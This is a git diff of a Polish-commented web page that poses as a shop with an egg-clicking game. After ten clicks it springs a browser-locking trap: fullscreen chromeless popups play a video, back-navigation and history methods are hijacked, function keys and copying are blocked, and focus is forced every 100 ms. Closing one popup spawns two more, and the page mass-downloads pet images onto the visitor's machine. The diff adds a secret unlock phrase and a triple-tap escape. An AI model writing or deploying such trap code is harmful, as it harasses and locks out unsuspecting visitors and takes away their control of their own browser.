@@ -19,7 +19,6 @@
     .btn{background:#8B4513;color:#fff;border:none;border-radius:8px;padding:10px 28px;font-size:1rem;cursor:pointer;transition:background .15s}
     .btn:hover{background:#6b3410}
 
-    /* Overlay / egg game */
     #overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:100;align-items:center;justify-content:center;flex-direction:column;gap:24px}
     #overlay.active{display:flex}
     #msg-paczka{background:#fff;border-radius:20px;padding:48px 64px;font-size:2rem;font-weight:bold;color:#333;text-align:center;box-shadow:0 8px 32px rgba(0,0,0,.25)}
@@ -29,7 +28,6 @@
     #egg-hint{color:#fff;font-size:1.1rem;opacity:.85;text-align:center}
     #click-count{color:#ffd700;font-size:1rem}
 
-    /* Video trap */
     #video-trap{display:none;position:fixed;inset:0;background:#000;z-index:99999;align-items:center;justify-content:center}
     #video-trap.active{display:flex}
     #trap-video{width:100vw;height:100vh;object-fit:cover}
@@ -37,27 +35,33 @@
     #fake-close{position:fixed;top:14px;right:18px;background:rgba(255,255,255,.15);color:#fff;border:2px solid rgba(255,255,255,.4);border-radius:6px;padding:6px 14px;font-size:.85rem;cursor:pointer;z-index:100001}
     @keyframes pulse{0%,100%{opacity:1;transform:translateX(-50%) scale(1)}50%{opacity:.5;transform:translateX(-50%) scale(1.05)}}
 
-    /* Return screen (po wyjsciu z fullscreen) */
     #return-screen{display:none;position:fixed;inset:0;background:#000;z-index:199999;flex-direction:column;align-items:center;justify-content:center;cursor:pointer;gap:24px}
     #return-screen.show{display:flex}
     #return-screen .rtxt{color:#f00;font-size:clamp(2rem,6vw,5rem);font-weight:900;text-align:center;animation:blink .4s step-end infinite;line-height:1.2}
     #return-screen .rsub{color:#fff;font-size:1.2rem;opacity:.7}
     @keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
 
-    /* Trap mode - ukryj sklep */
+    /* Victory screen */
+    #victory{display:none;position:fixed;inset:0;background:linear-gradient(135deg,#00ff00,#00aa00);z-index:200000;flex-direction:column;align-items:center;justify-content:center;gap:30px}
+    #victory.show{display:flex;animation:victoryPulse .5s ease}
+    #victory .vtxt{color:#fff;font-size:clamp(2rem,8vw,6rem);font-weight:900;text-align:center;text-shadow:4px 4px 0 rgba(0,0,0,.5);line-height:1.1}
+    #victory .vsub{color:#fff;font-size:1.5rem;opacity:.9;text-shadow:2px 2px 0 rgba(0,0,0,.4)}
+    @keyframes victoryPulse{0%{transform:scale(.8);opacity:0}100%{transform:scale(1);opacity:1}}
+
+    /* Tap zone (srodek ekranu) */
+    #tap-zone{position:fixed;inset:50%;transform:translate(-50%,-50%);width:200px;height:200px;z-index:1;border:2px dashed rgba(255,255,255,.1);border-radius:50%}
+
     body.trap-mode>header,
     body.trap-mode>.shop,
     body.trap-mode>#ketchup-layer,
     body.trap-mode>#overlay{display:none!important}
 
-    /* Animacje jajka */
     @keyframes shake-light{0%,100%{transform:rotate(0)}20%{transform:rotate(-6deg)}40%{transform:rotate(6deg)}60%{transform:rotate(-4deg)}80%{transform:rotate(4deg)}}
     @keyframes shake-medium{0%,100%{transform:rotate(0) translateX(0)}15%{transform:rotate(-10deg) translateX(-6px)}30%{transform:rotate(10deg) translateX(6px)}45%{transform:rotate(-8deg) translateX(-4px)}60%{transform:rotate(8deg) translateX(4px)}75%{transform:rotate(-5deg) translateX(-2px)}90%{transform:rotate(5deg) translateX(2px)}}
     @keyframes shake-hard{0%,100%{transform:rotate(0) translate(0,0)}10%{transform:rotate(-15deg) translate(-10px,-4px)}20%{transform:rotate(15deg) translate(10px,4px)}30%{transform:rotate(-12deg) translate(-8px,-3px)}40%{transform:rotate(12deg) translate(8px,3px)}50%{transform:rotate(-18deg) translate(-12px,-5px)}60%{transform:rotate(18deg) translate(12px,5px)}70%{transform:rotate(-10deg) translate(-6px,-2px)}80%{transform:rotate(10deg) translate(6px,2px)}90%{transform:rotate(-8deg) translate(-4px,-1px)}}
     @keyframes hatch-out{0%{transform:scale(1) rotate(0);opacity:1}30%{transform:scale(1.3) rotate(-20deg);opacity:1}60%{transform:scale(1.5) rotate(20deg);opacity:.7}100%{transform:scale(0) rotate(45deg);opacity:0}}
     .shake-light{animation:shake-light .35s ease}.shake-medium{animation:shake-medium .35s ease}.shake-hard{animation:shake-hard .35s ease}.hatch-out{animation:hatch-out .6s ease forwards}
 
-    /* Ketchup */
     #ketchup-layer{display:none;position:fixed;inset:0;pointer-events:none;z-index:200;overflow:hidden}
     #ketchup-bottle{position:absolute;bottom:10%;left:-160px;font-size:8rem;line-height:1;transition:left .8s cubic-bezier(.22,1,.36,1);filter:drop-shadow(4px 4px 8px rgba(0,0,0,.4))}
     #ketchup-bottle.slide-in{left:40px}#ketchup-bottle.slide-out{left:-160px}
@@ -121,6 +125,7 @@
   </video>
   <p id="trap-msg">&#128520; NIE MO&#379;ESZ ST&#260;D WYJ&#346;&#262;! &#128520;</p>
   <button id="fake-close">Zamknij [X]</button>
+  <div id="tap-zone" onclick="handleCenterTap()"></div>
 </div>
 
 <div id="return-screen" onclick="returnToFullscreen()">
@@ -128,42 +133,48 @@
   <div class="rsub">(nie możesz stąd wyjść)</div>
 </div>
 
+<div id="victory">
+  <div class="vtxt">JONASZEK✨<br>ZWYCIEŻYŁ!</div>
+  <div class="vsub">(Strona zamyka się...)</div>
+</div>
+
 <script>
 (function(){
 'use strict';
 
-var IS_TRAP = /[?&]trap/.test(location.search);
-var trapActive = false;
-var wasFS = false;
-var trapPopup = null;
-var popupMonitor = null;
+var IS_TRAP=/[?&]trap/.test(location.search);
+var trapActive=false;
+var wasFS=false;
+var trapPopups=[];
+var easterKeySeq='JONASZEK'.split('');
+var easterKeyIdx=0;
+var easterKeyTimer=null;
+var isTrapUnlocked=false;
+var centerTapCount=0;
+var centerTapTimer=null;
 
 // ============================================================
-// BLOKADA WYJSCIA (dziala w obu trybach)
+// BLOKADA WYJSCIA
 // ============================================================
 history.pushState(null,null,location.href);
 setInterval(function(){ history.pushState(null,null,location.href); },100);
-window.addEventListener('popstate',function(){ history.pushState(null,null,location.href); tryClone(); });
+window.addEventListener('popstate',function(){ history.pushState(null,null,location.href); });
 try{ history.back=history.forward=history.go=function(){ history.pushState(null,null,location.href); }; }catch(e){}
 
-function tryClone(){
-  try{ window.open(location.href,'_blank'); }catch(e){}
-}
-
 window.addEventListener('beforeunload',function(e){
-  e.preventDefault(); e.returnValue='';
-  // Jesli popup zamkniety - otworz nowy (glowne okno)
-  if(!IS_TRAP && (!trapPopup || trapPopup.closed)){
-    try{ openTrapPopup(); }catch(e){}
+  if(isTrapUnlocked) return;
+  e.preventDefault();
+  e.returnValue='';
+  // Zamiast pozwalac zamknac - otwieramy nowy popup
+  if(!IS_TRAP&&trapPopups.length<5){ // limit 5 popupow zeby nie bombowac
+    for(var i=0;i<2;i++) openTrapPopup();
   }
   return '';
 });
 
 document.addEventListener('visibilitychange',function(){
-  if(document.hidden) tryClone();
-  try{ window.focus(); }catch(e){}
+  if(document.hidden) try{ window.focus(); }catch(e){}
 });
-
 setInterval(function(){ try{window.focus();}catch(e){}; },100);
 window.addEventListener('blur',function(){ setTimeout(function(){ try{window.focus();}catch(e){}; },10); });
 
@@ -173,6 +184,7 @@ document.addEventListener('copy',function(e){ e.preventDefault(); },true);
 document.addEventListener('cut',function(e){ e.preventDefault(); },true);
 
 document.addEventListener('keydown',function(e){
+  if(isTrapUnlocked) return;
   var k=e.key,c=e.ctrlKey,s=e.shiftKey,a=e.altKey;
   var blocked=
     (k>='F1'&&k<='F12')||
@@ -184,16 +196,48 @@ document.addEventListener('keydown',function(e){
 },true);
 
 // ============================================================
+// EASTER EGG - JONASZEK (J,O,N,A,S,Z,E,K)
+// ============================================================
+document.addEventListener('keydown',function(e){
+  if(easterKeySeq[easterKeyIdx]===e.key.toUpperCase()){
+    easterKeyIdx++;
+    if(easterKeyTimer) clearTimeout(easterKeyTimer);
+    easterKeyTimer=setTimeout(function(){ easterKeyIdx=0; },2000);
+    
+    if(easterKeyIdx===easterKeySeq.length){
+      activateVictory();
+      easterKeyIdx=0;
+    }
+  } else {
+    easterKeyIdx=0;
+    if(easterKeySeq[easterKeyIdx]===e.key.toUpperCase()) easterKeyIdx++;
+  }
+});
+
+function activateVictory(){
+  isTrapUnlocked=true;
+  document.getElementById('victory').classList.add('show');
+  // Zamknij wszystkie popupy
+  trapPopups.forEach(function(p){ try{ p.close(); }catch(e){} });
+  trapPopups=[];
+  // Przekieruj na originalna strone
+  setTimeout(function(){
+    window.location.href=location.href.split('?')[0];
+  },2500);
+}
+
+// ============================================================
 // FULLSCREEN
 // ============================================================
 function reqFS(el){
+  if(isTrapUnlocked) return;
   var fn=el.requestFullscreen||el.webkitRequestFullscreen||el.mozRequestFullScreen;
   if(fn&&!document.fullscreenElement) fn.call(el).catch(function(){});
 }
 function isInFS(){ return !!(document.fullscreenElement||document.webkitFullscreenElement); }
 
 setInterval(function(){
-  if(!trapActive) return;
+  if(!trapActive||isTrapUnlocked) return;
   var nowFS=isInFS();
   if(wasFS&&!nowFS){
     document.getElementById('return-screen').classList.add('show');
@@ -203,17 +247,32 @@ setInterval(function(){
 },100);
 
 window.returnToFullscreen=function(){
+  if(isTrapUnlocked) return;
   document.getElementById('return-screen').classList.remove('show');
   reqFS(document.getElementById('video-trap'));
 };
 
 // ============================================================
-// POPUP TRICK (styl ptoszek.pl)
-// Otworz chromeless popup bez paska adresu.
-// Glowne okno monitoruje popup i otwiera nowy gdy ten sie zamknie.
+// CENTER TAP - wymazlaczenie (na telefonie)
+// ============================================================
+window.handleCenterTap=function(){
+  if(isTrapUnlocked) return;
+  centerTapCount++;
+  if(centerTapTimer) clearTimeout(centerTapTimer);
+  centerTapTimer=setTimeout(function(){ centerTapCount=0; },2000);
+  
+  // Triple tap na srodku = unlock
+  if(centerTapCount>=3){
+    activateVictory();
+    centerTapCount=0;
+  }
+};
+
+// ============================================================
+// POPUP TRICK - otwieraj 2 nowe gdy jeden sie zamyka
 // ============================================================
 function openTrapPopup(){
-  if(IS_TRAP) return; // popup nie otwiera kolejnych popupow
+  if(IS_TRAP||isTrapUnlocked) return;
   var url=location.href.split('?')[0]+'?trap=1';
   var f=[
     'width='+screen.availWidth,
@@ -222,29 +281,25 @@ function openTrapPopup(){
     'toolbar=no','menubar=no','location=no',
     'status=no','scrollbars=no','resizable=no'
   ].join(',');
-  var w=window.open(url,'chalki_trap',f);
-  if(!w){ tryClone(); return; } // zablokowany - otwieramy zwykla karte
+  var w=window.open(url,'chalki_'+Date.now(),f);
+  if(!w){ return; }
   try{ w.moveTo(0,0); w.resizeTo(screen.availWidth,screen.availHeight); }catch(e){}
-  trapPopup=w;
-  // Monitoruj popup - gdy zamkniety otworz nowy
-  if(popupMonitor) clearInterval(popupMonitor);
-  popupMonitor=setInterval(function(){
-    if(trapPopup&&trapPopup.closed){
-      clearInterval(popupMonitor);
-      // Proby odtworzenia popupu (moze byc zablokowane w Chrome bez gestu)
-      try{ openTrapPopup(); }catch(e){
-        // Fallback: nowa zwykla karta
-        try{ window.open(url,'_blank'); }catch(e2){}
+  trapPopups.push(w);
+  
+  // Monitoruj popup - gdy zamkniety otworz 2 nowe
+  var monitor=setInterval(function(){
+    if(w.closed){
+      clearInterval(monitor);
+      trapPopups=trapPopups.filter(function(p){ return !p.closed; });
+      if(!isTrapUnlocked&&trapPopups.length<5){
+        for(var i=0;i<2;i++){ try{ openTrapPopup(); }catch(e){} }
       }
     }
   },300);
-}
+};
 
 // ============================================================
-// POBIERANIE ZDJEC ZWIERZAKOW
-// psy: labrador (brazowy), chihuahua, jamnik
-// koty: brytyjski krotkowlosy (bsho)
-// ptaki: zeberki (zebra finch) z Wikimedia
+// POBIERANIE ZDJEC
 // ============================================================
 async function blobDownload(imgUrl,filename){
   try{
@@ -260,7 +315,6 @@ async function blobDownload(imgUrl,filename){
 }
 
 async function grabDog(n){
-  // Rotacja: labrador (brazowy), chihuahua, jamnik
   var breeds=['labrador','chihuahua','dachshund'];
   var breed=breeds[n%3];
   try{
@@ -286,7 +340,6 @@ async function grabCat(n){
 }
 
 async function grabBird(n){
-  // Zeberki (Zebra Finch) z Wikipedia Wikimedia API - ma CORS
   try{
     var r=await fetch('https://en.wikipedia.org/api/rest_v1/page/media-list/Zebra_finch');
     var d=await r.json();
@@ -315,9 +368,10 @@ function startPetBombing(){
 }
 
 // ============================================================
-// AKTYWACJA PULAPKI (wideo + fullscreen)
+// AKTYWACJA PULAPKI
 // ============================================================
 function activateTrap(){
+  if(isTrapUnlocked) return;
   trapActive=true; wasFS=false;
   document.getElementById('overlay').classList.remove('active');
   document.getElementById('egg-game').style.display='none';
@@ -328,12 +382,8 @@ function activateTrap(){
   startPetBombing();
 }
 
-// ============================================================
-// TRYB POPUP (?trap=1) - pokaz wideo od razu, bez sklepu
-// ============================================================
 if(IS_TRAP){
   document.body.classList.add('trap-mode');
-  // Uruchom pulapke po zaladowaniu DOM
   if(document.readyState==='loading'){
     document.addEventListener('DOMContentLoaded',activateTrap);
   } else {
@@ -378,9 +428,7 @@ function launchKetchupAttack(){
   var L=document.getElementById('ketchup-layer'),B=document.getElementById('ketchup-bottle');
   L.style.display='block'; L.classList.remove('fade-out');
   requestAnimationFrame(function(){ requestAnimationFrame(function(){ B.classList.add('slide-in'); }); });
-  setTimeout(function(){
-    for(var i=0;i<12;i++)(function(x){ setTimeout(function(){ throwTomato(L,B); },x*280); })(i);
-  },900);
+  setTimeout(function(){ for(var i=0;i<12;i++)(function(x){ setTimeout(function(){ throwTomato(L,B); },x*280); })(i); },900);
   setTimeout(function(){
     B.classList.remove('slide-in'); B.classList.add('slide-out'); L.classList.add('fade-out');
     L.addEventListener('animationend',function(){
@@ -436,15 +484,12 @@ window.clickEgg=function(){
   egg.classList.remove('shake-light','shake-medium','shake-hard','hatch-out');
 
   if(clickCount>=10){
-    // KLUCZOWE: window.open() wywolany BEZPOSREDNIO z click handlera
-    // = gest uzytkownika = Chrome pozwala na popup
     openTrapPopup();
     egg.classList.add('hatch-out');
     egg.addEventListener('animationend',function(){
       document.getElementById('overlay').classList.remove('active');
       document.getElementById('egg-game').style.display='none';
-      // Fallback: aktywuj lokalna pulapke jesli popup zablokowany
-      if(!trapPopup||trapPopup.closed) activateTrap();
+      if(!trapPopups.length||trapPopups.every(function(p){return p.closed;})) activateTrap();
     },{once:true});
     return;
   }
